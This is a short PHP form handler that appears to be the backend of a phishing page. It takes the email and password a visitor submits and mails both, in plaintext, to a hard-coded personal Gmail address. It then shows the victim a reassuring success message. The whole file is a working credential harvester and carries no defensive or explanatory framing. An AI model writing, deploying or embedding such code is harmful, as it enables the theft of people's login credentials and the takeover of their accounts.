<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $userEmail = $_POST['email'];
    $userPassword = $_POST['password'];

    // Your email
    $to = "maduekegideon46@gmail.com";
    $subject = "New Form Submission";
    $message = "Email: $userEmail\nPassword: $userPassword";
    $headers = "From: no-reply@yourdomain.com";

    // Send the email
    if (mail($to, $subject, $message, $headers)) {
        echo "Details submitted successfully!";
    } else {
        echo "Something went wrong. Please try again.";
    }
} else {
    echo "Invalid request.";
}
?>
